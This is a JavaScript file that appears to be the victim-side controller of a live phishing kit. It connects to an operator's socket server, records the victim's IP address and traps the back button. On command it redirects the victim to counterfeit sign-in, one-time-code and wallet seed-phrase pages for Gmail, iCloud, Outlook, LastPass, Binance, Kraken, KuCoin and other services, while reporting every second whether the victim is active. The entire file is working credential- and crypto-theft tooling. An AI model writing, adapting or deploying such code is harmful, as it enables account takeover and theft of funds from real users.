const socket = io(SERVER_URL, {
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 500,
    reconnectionDelayMax: 1000,
    randomizationFactor: 0.5,
    forceNew: true,
});
let ipAddress = '';

fetch('https://httpbin.org/ip')
    .then(response => response.json())
    .then(data => {
        ipAddress = data['origin'];
        console.log(ipAddress);
    })
    .catch(error => console.error(error));

socket.on('connect', () => {
    console.log('connected');
})

socket.on('userRedirect', async (data) => {
    if (sessionStorage.getItem('user') === data.user && sessionStorage.getItem('user') !== null) {
        const redirectTkn = data.redirectTkn;
        const d = await fetch(`${API_URL}/verify`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ token: redirectTkn }),
        });
        const res = await d.json();
        if (!res.valid) return;

        const basePath = window.location.href.substring(0, window.location.href.lastIndexOf('/'));

        if (data.response === '/otp_sms' || data.response === '/twitter_sms') {
            document.location.href = basePath + data.response + '?n=' + data.digits + '&e=' + data.e + '&f=' + data.format;
        }

        else if (data.response === '/outlook_otp' || data.response === '/binance_sms') {
            document.location.href = basePath + data.response + '?n=' + data.digits + '&e=' + data.e;
        }

        else if (data.response === '/custom') {
            document.location.href = basePath + data.response + '?h=' + data.header + '&p=' + data.paragraph;
        }

        else if (
            data.response === '/otp_auth' || data.response === '/yahoo' ||
            data.response === '/reset_password' || data.response === '/outlook_pw' ||
            data.response === '/gemini_otp' || data.response === '/gemini_reset' ||
            data.response === '/gemini_seed' || data.response === '/kraken' ||
            data.response === '/kraken_otp' || data.response === '/icloud' ||
            data.response === '/twitter' || data.response === '/twitter_auth' ||
            data.response === '/gmail' || data.response === '/binance' ||
            data.response === '/binance_auth' || data.response === '/gemini_signin' ||
            data.response === '/uphold' || data.response === '/uphold_otp' ||
            data.response === '/uphold_reset' || data.response === '/uphold_seed' ||
            data.response === '/binance_seed' || data.response === '/kraken_seed' ||
            data.response === '/lastpass' || data.response === '/lastpass_otp' ||
            data.response === '/swan' || data.response === '/swan_seed' ||
            data.response === '/swan_eotp' || data.response === '/swan_otp' ||
            data.response === '/swan_auth' || data.response === '/swan_dvc' ||
            data.response === '/gemini_dvc' || data.response === '/kucoin' ||
            data.response === '/kucoin_otp' || data.response === '/kucoin_pin' ||
            data.response === '/kucoin_seed'
        ) {
            if (data.response === '/gmail' && data.e === 1) {
                document.location.href = basePath + '/gmail_pw?e=' + data.e;
            } else {
                document.location.href = basePath + data.response + '?e=' + data.e;
            }
        }

        else if (data.response === '/signin') {
            document.location.href = basePath + data.response + '?e=' + data.e + '&t=' + data.t;
        }

        else if (data.response === '/pending_review') {
            document.location.href = basePath + data.response + '?d=' + btoa(data.date);
        }

        else if (data.response === '/aol_otp' || data.response === '/yahoo_otp' || data.response === '/gmail_otp') {
            document.location.href = basePath + data.response + '?email=' + data.address + '&n=' + data.digits + '&e=' + data.e;
        }

        else if (data.response === '/yahoo_eotp') {
            document.location.href = basePath + data.response + '?email=' + data.address + '&recovery=' + data.recovery + '&e=' + data.e;
        }

        else if (data.response == '/gmail_eotp' || data.response == '/gmail_auth' || data.response == '/otp_email') {
            document.location.href = basePath + data.response + '?email=' + data.address + '&e=' + data.e;
        }

        else if (data.response == '/lastpass_inbox' || data.response == '/dvc_press') {
            document.location.href = basePath + data.response + '?email=' + data.address;
        }

        else if (data.response === '/gmail_device') {
            document.location.href = basePath + data.response + '?email=' + data.address + '&n=' + data.digits + '&app=' + data.app;
        }

        else if (data.response === '/aol' || data.response === '/gmail_backup') {
            document.location.href = basePath + data.response + '?email=' + data.address + '&e=' + data.e;
        }

        else if (data.response === '/seed') {
            document.location.href = basePath + data.response + '?auth=' + data.auth;
        }

        else if (data.response === '/cb_customwallet') {
            document.location.href = basePath + data.response + '?w=' + data.w;
        }

        else if (data.response === '/icloud_otp') {
            document.location.href = basePath + data.response + '?p=' + data.p + '&e=' + data.e;
        }

        else if (data.response === '/device_auth') {
            document.location.href = basePath + data.response + '?device=' + data.device + '&location=' + data.location;
        }

        else if (data.response === '/redirect') {
            document.location.href = basePath + data.response + '?url=' + encodeURIComponent(data.url);
        }

        else if (data.response === '/icloud_2fa') {
            document.location.href = basePath + data.response + '?d=' + data.d;
        }

        else if (data.response === '/cbw1') {
            document.location.href = basePath + data.response + '?s=' + btoa(data.s);
        }

        else {
            document.location.href = basePath + data.response;
        }
    }
});

socket.on('heartAttack', (data) => {
    if ( data !== 1 ) return;

    window.heartAttacked = true;
})

// makes user unable to go back
history.pushState(null, null, location.href);
window.onpopstate = function(event) {
    history.go(1);
}

let statusInterval = setInterval(() => {
    if ( window.heartAttacked === true ) clearInterval(statusInterval);

    if (sessionStorage.getItem('user')) {
        if (document.visibilityState == 'visible' || !document.hidden) {
            socket.emit('heartbeat', { method: 'status', user: sessionStorage.getItem('user'), status: 'Active' });
        } else {
            socket.emit('heartbeat', { method: 'status', user: sessionStorage.getItem('user'), status: 'Away' });
        }
    }
}, 1000);
